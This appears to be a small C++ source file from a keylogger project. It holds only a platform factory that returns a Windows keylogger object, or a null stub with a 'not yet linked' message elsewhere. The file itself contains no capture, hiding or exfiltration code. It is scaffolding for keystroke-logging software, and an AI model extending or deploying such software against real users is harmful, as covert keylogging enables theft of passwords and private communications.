#include "keylogger.hpp"

#ifdef _WIN32

#include "keylogger_win.hpp"

IKeylogger* createPlatformKeylogger() {
    return new WindowsKeylogger();
}

#else

#include <iostream>

IKeylogger* createPlatformKeylogger() {
    std::cout << "platform implementation not yet linked\n";
    return nullptr;
}

#endif
